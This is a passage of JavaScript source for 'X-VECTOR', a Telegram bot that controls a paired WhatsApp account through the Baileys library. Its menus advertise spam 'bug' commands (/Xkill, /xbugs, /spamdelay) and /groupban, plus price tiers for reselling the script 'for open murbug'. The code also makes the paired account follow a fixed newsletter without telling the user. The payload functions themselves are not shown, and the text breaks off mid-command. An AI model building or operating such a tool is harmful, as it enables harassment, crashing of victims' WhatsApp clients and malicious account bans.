const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  proto,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const https = require("https");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Db/premiums.json";
const adminFile = "./Db/admins.json";
const dbPath = "./Db/ControlCommand.json";
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/km50ik.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];
// Func Block/Unblock Command
const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  let cmd = text.split(" ")[0].toLowerCase();

  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();

  // USER ID
  const userId = String(ctx.from.id);

  const blocked =
    db.groupCmdBlock?.[userId] || [];

  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock."
    );
  }

  return next();
};

const checkGroupPremium = async (ctx, next) => {
  // skip PM
  if (ctx.chat.type === "private")
    return next();

  const premium = loadPremium();

  const groupId = String(ctx.chat.id);

  // cek premium
  if (!premium.includes(groupId)) {
    return ctx.reply(
      "⛔ Grup ini bukan premium."
    );
  }

  return next();
};

// Tools Loading Menu New
async function LoadingViper(ctx) {
    const frames = [
    "𝐋 𝐎 𝐀 𝐃 𝐈 𝐍 𝐆 - 𝐒 𝐘 𝐒 𝐓 𝐄 𝐌 🕘",
    "[░░░░░░░░░░░░░░░] 0%",
    "[▓▓▓░░░░░░░░░░░░] 11%",
    "[▓▓▓▓▓▓░░░░░░░░░] 25%",
    "[▓▓▓▓▓▓▓▓▓░░░░░░] 41%",
    "[▓▓▓▓▓▓▓▓▓▓▓▓░░░] 84%",
    "[▓▓▓▓▓▓▓▓▓▓▓▓▓░░] 95%",
    "[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%",
    "𝐋 𝐎 𝐀 𝐃 𝐈 𝐍 𝐆 - 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 ✅"
    ];

    // Kirim pesan awal
    const msg = await ctx.reply(frames[0]);

    // Loop untuk animasi
    for (let i = 1; i < frames.length; i++) {
        await new Promise(res => setTimeout(res, 500)); // delay 500ms
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            null,
            frames[i]
        ).catch(() => {});
    }

    // Hapus pesan setelah selesai loading
    await ctx.deleteMessage(msg.message_id).catch(() => {});

    return msg.message_id;
}
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

// ~ Raw Github ~ \\
const databaseUrl =
  "https://raw.githubusercontent.com/Darlin77/Base-/refs/heads/main/token.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(databaseUrl);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red.bold("Gagal Saat Mengambil Data Dari Url", error.message));
    return [];
  }
}

async function validateToken() {
 try {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.bold.red(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋\n`));
          process.exit(1);
    }
     startBot()
  } catch (error) {
   console.error("Error:", error);
      process.exit(1);
  }
}

function startBot() {
  console.log(
    chalk.cyan(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀
      `));
  console.log(
    chalk.bold.green(`
🆕 Latest Update: 17 - Sep - 2026
📂 Information: Hello world
`));
}

validateToken();
startBot();

async function checkExpired() {

    const EXPIRED = new Date("2050-05-15T07:25:00Z").getTime()

    try {

        // ambil waktu server dari header
        const res = await axios.get("https://google.com")
        const now = new Date(res.headers.date).getTime()

        const diff = EXPIRED - now

        if (diff <= 0) {
            console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @canxenv")
            process.exit(0);
        }

        const hari = Math.floor(diff / 86400000)
        const jam = Math.floor((diff % 86400000) / 3600000)

        console.log(`✅ SCRIPT ONLINE | WAKTU TOLERANSI TERSISA | ${hari} HARI ${jam} JAM LAGI`)

    } catch {
        console.log("⚠️ Gagal cek waktu internet")
    }

}

checkExpired();
// WhatsApp Connection

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'SennOfficial',
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363413007752913@newsletter");

      isWhatsAppConnected = true;

      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));

        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belom Terhubung Kontol
`);
return;
}
next();
};

////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const now = moment().tz("Asia/Jakarta");
  const dateText = now.format("D/M/YYYY");
  const todayText = now.format("dddd, D MMMM YYYY");
  const waktuRunPanel = getUptime();

  const isPremium = premiumUsers.includes(userId);
  const waStatus = sock && sock.user
    ? "✅ Terhubung Jir, Gas Bug"
    : "❌ Sender Lum Terhubung";

  const startMessage = `
<blockquote>✨ 〔 X-VECTOR 〕
ʜᴏʟᴀ ʙᴀɴɢ ᴀʙᴀɴɢ ${Name || "Engga Ada Usn Dia"} sᴇʟᴀᴍᴀᴛ ᴍᴇɴᴜɴᴀᴋᴀɴ X-VECTOR ɴᴇᴡ
━━━━━━━━━━━━━━━━━━━━━━
┋✨ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @canxenv 👑
┋✨ ᴠᴇʀsɪᴏɴ : 1.0 ✨
┋✨ sᴛᴀᴛᴜs : ${isPremium}</blockquote>
<blockquote>〔 Informasi Bot 〕
━━━━━━━━━━━━━━━━━━━━━━
⍑✨ sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${waStatus}
⍑✨ ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs: ${waktuRunPanel}
⍑👤 ᴜsᴇʀɴᴀᴍᴇ : ${Name || "Engga Ada Usn Dia"}</blockquote>
`;

  const mainKeyboard = [
    [
      {
        text: "OWNER MENU",
        callback_data: "owner_menu",
        style: "Danger",
      },
      {
        text: "BUGS MENU",
        callback_data: "bug_menu",
        style: "Danger",
      },
    ],
    [
      {
        text: "INFORMATION",
        url: "https://t.me/xvectorrr",
        style: "Danger",
      },
    ],
    [
      {
        text: "TOOLS MENU",
        callback_data: "all_menu",
        style: "Danger",
      },
      {
        text: "TQ TO",
        callback_data: "tqto_menu",
        style: 'Danger',
      },
    ],
    [
     {
       text: "HARGA SCRIPT",
       callback_data: "harga_menu",
       style: 'Primary',
     },
   ],
  ];
  
    await ctx.replyWithPhoto(getRandomImage(), {
    caption: startMessage,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: mainKeyboard,
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
        
      const mainMenuMessage = `
<blockquote>〘 Akses Menu 〙</blockquote>
<blockquote>𖤓 /addsender - Add Sender
𖤓 /resetsession - Reset Session
𖤓 /addadmin - Add Admin
𖤓 /deladmin - Delete Admin
𖤓 /listadmin - List Admin
𖤓 /addprem - Add Prem
𖤓 /delprem - Delete Prem
𖤓 /listprem - List Premium
𖤓 /blockcmd - Block Cmd
𖤓 /unblockcmd - Unblock Cmd</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 Back To Menu", callback_data: "back", style: "Danger" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
bot.action("all_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
      const mainMenuMessage = `
<blockquote>〘 Tools Menu 〙</blockquote>
<blockquote>〣 /iqc - ss iphone 
〣 /cekfunction - cek eror function
〣 /testfunction - testing function
〣 /play - music spotify
〣 /dltiktok - download vd tiktok no wm
〣 /brat - text
╘═—————————————–——═⬡</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 Back To Menu", callback_data: "back", style: "Danger" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler bug_custom
bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user
    ? "✅ Terhubung Jir, Gas Bug"
    : "❌ Sender Lum Terhubung";
     
  const mainMenuMessage = `
<blockquote>╭━〔 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 X-VECTOR〕━━━━━━━━━╮
│𖤓 /Xkill          ➜ bebas spam✅
│𖤓 /xbugs        ➜ bebas spam✅
│𖤓 /groupban     ➜ no spam✅
│𖤓 /groupbanv2   ➜ no spam✅
│𖤓 /spamdelayv2 ➜ bebas spam✅
│𖤓 /spamdelay    ➜ bebas spam✅
│𖤓 /spamdelayv3 ➜ bebas spam✅
╰━━━━━━━━━━━━━━━━━━━━━━━╯</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 Back To Menu", callback_data: "back", style: "Danger" }],
     [{ text: "Ban Group", callback_data: "ban_gb", style: "Primary" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
// Handler untuk ban gb
bot.action('ban_gb', async (ctx) => {
    const mainMenuMessage = `
<blockquote>〔 BAN GROUP 〕</blockquote>
<blockquote>/groupban</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 Back To Menu", callback_data: "back", style: "Danger" }],
      [{ text: "Back To Menu Bugs", callback_data: "bug_menu", style: "Danger" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
// Handler untuk tqto menu
bot.action('tqto_menu', async (ctx) => {
    const mainMenuMessage = `
<blockquote>——————————————═⬡
〣 @canxenv - 𝐃𝐞𝐩
〣 ORTU - SUPORT
〣 ALL SUPPORT X-VECTOR 
〣 ALL MEMBER GW - SUPORT
——————————————═⬡</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 Back To Menu", callback_data: "back", style: "Danger" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
// Handler untuk harga script
bot.action("harga_menu", async (ctx) => {
  await ctx.answerCbQuery();

  const mainMenuMessage = `
<blockquote>⌑ <tg-emoji emoji-id="5435886793671067739">💀</tg-emoji> X-VECTOR <tg-emoji emoji-id="5435886793671067739">💀</tg-emoji> ⌑</blockquote>

<tg-emoji emoji-id="5470141799261555371">➡️</tg-emoji> Type script: bebas spam bugs
<tg-emoji emoji-id="5470141799261555371">➡️</tg-emoji> Version : Latest
<tg-emoji emoji-id="5470141799261555371">➡️</tg-emoji> Cocok untuk: Open murbug

<blockquote>⌑ <tg-emoji emoji-id="5116648080787112958">💰</tg-emoji> 𝐏𝐑𝐈𝐂𝐄 𝐒𝐂𝐑𝐈𝐏𝐓?

Rp 4.000 full update
Rp 6.000 reseller
Rp 8.000 Partner
Rp 10.000 moderator
Rp 12.000 CEO
Rp 14.000 owner
Rp 18.000 Creator

<tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> Telegram owner:
@canxenv <tg-emoji emoji-id="5208727996315220567">✅</tg-emoji></blockquote>
`;

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "「🔙」 Kembali",
          callback_data: "back"
        }
      ]
    ]
  };

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: getRandomImage(),
        caption: mainMenuMessage,
        parse_mode: "HTML"
      },
      {
        reply_markup: keyboard
      }
    );
  } catch (err) {
    console.error("Gagal edit harga script:", err);

    try {
      await ctx.replyWithPhoto(getRandomImage(), {
        caption: mainMenuMessage,
        parse_mode: "HTML",
        reply_markup: keyboard
      });
    } catch (err2) {
      console.error("Gagal kirim harga script:", err2);
    }
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const now = moment().tz("Asia/Jakarta");
  const dateText = now.format("D/M/YYYY");
  const todayText = now.format("dddd, D MMMM YYYY");
  const waktuRunPanel = getUptime();

  const isPremium = premiumUsers.includes(userId);
  const waStatus = sock && sock.user
    ? "✅ Terhubung Jir, Gas Bug"
    : "❌ Sender Lum Terhubung";
      
  const mainMenuMessage = `
<blockquote>✨ 〔 X-VECTOR 〕
ʜᴏʟᴀ ʙᴀɴɢ ᴀʙᴀɴɢ ${Name || "Engga Ada Usn Dia"} sᴇʟᴀᴍᴀᴛ ᴍᴇɴᴜɴᴀᴋᴀɴ X-VECTOR ɴᴇᴡ
━━━━━━━━━━━━━━━━━━━━━━
┋✨ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @canxenv 👑
┋✨ ᴠᴇʀsɪᴏɴ : 1.0 ✨
┋✨ sᴛᴀᴛᴜs : ${isPremium}</blockquote>
<blockquote>〔 Informasi Bot 〕
━━━━━━━━━━━━━━━━━━━━━━
⍑✨ sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${waStatus}
⍑✨ ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs: ${waktuRunPanel}
⍑👤 ᴜsᴇʀɴᴀᴍᴇ : ${Name || "Engga Ada Usn Dia"}</blockquote>
`;

 const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "OWNER MENU",
        callback_data: "owner_menu",
        style: "Danger",
      },
      {
        text: "BUGS MENU",
        callback_data: "bug_menu",
        style: "Danger",
      },
    ],
    [
      {
        text: "INFORMATION",
        url: "https://t.me/xvectorrr",
        style: "Danger",
      },
    ],
    [
      {
        text: "TOOLS MENU",
        callback_data: "all_menu",
        style: "Danger",
      },
      {
        text: "TQ TO",
        callback_data: "tqto_menu",
        style: 'Danger',
      },
    ],
    [
     {
       text: "HARGA SCRIPT",
       callback_data: "harga_menu",
       style: 'Primary',
     },
   ],
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
//////// -- CASE TOOLS --- \\\\\\\\\\\
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});
bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|SennJmbud",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
